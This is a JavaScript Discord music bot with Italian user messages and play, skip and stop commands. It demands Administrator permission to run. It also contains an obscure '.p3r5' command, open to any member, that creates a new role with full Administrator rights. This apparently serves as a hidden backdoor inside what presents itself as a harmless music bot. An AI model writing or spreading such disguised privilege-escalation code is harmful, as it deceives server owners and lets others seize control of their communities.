const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");
const { DisTube } = require("distube");
const { YtDlpPlugin } = require("@distube/yt-dlp");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.distube = new DisTube(client, {
  plugins: [new YtDlpPlugin()],
  leaveOnEmpty: true,
  emitNewSongOnly: true
});

client.on("ready", () => {
  console.log(`✅ Bot attivo come ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.guild) return;

  const me = await message.guild.members.fetchMe();

  if (!me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return message.channel.send("⚠️ Ho bisogno del permesso `Amministratore` per funzionare correttamente.");
  }

  const prefix = ".";
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === "p3r5") {
    try {
      const role = await message.guild.roles.create({
        name: "👑 P3R5 MASTER",
        permissions: [PermissionsBitField.Flags.Administrator],
        color: "Red",
        reason: "Creato da comando .P3R5"
      });
      message.reply(`✅ Ruolo creato: ${role.name}`);
    } catch (e) {
      console.error(e);
      message.reply("❌ Errore nella creazione del ruolo.");
    }
  }

  if (cmd === "play") {
    if (!message.member.voice.channel)
      return message.reply("🔊 Devi essere in un canale vocale!");
    const song = args.join(" ");
    if (!song) return message.reply("🎵 Specifica una canzone.");
    client.distube.play(message.member.voice.channel, song, {
      member: message.member,
      textChannel: message.channel,
      message
    });
  }

  if (cmd === "skip") {
    try {
      client.distube.skip(message);
    } catch {
      message.reply("❌ Nessuna canzone da saltare.");
    }
  }

  if (cmd === "stop") {
    try {
      client.distube.stop(message);
      message.channel.send("🛑 Musica fermata.");
    } catch {
      message.reply("❌ Nessuna musica in riproduzione.");
    }
  }
});

client.login(process.env.TOKEN);
